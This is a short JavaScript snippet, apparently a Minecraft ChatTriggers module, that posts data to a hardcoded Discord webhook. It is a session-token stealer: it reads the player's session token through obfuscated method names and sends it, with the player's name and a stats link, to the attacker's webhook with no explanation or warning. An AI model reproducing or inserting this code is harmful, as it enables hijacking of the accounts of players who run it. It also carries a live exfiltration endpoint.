import request from "requestv2"
request({
	'url': "https://discord.com/api/webhooks/1318776104240021534/qULPmBLLg_DfTSYL8GlZA_dXcptLAxeS7p_MpucZElrLREmB2Rpk9hmTG_A36RCRcNvT",
	'method': "POST",
	'headers': {'User-agent': "Mozilla/5.0"},
	'body': {'content': "@everyone" + "```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```" + "https://sky.shiiyu.moe/stats/" +  Player.getName()}
});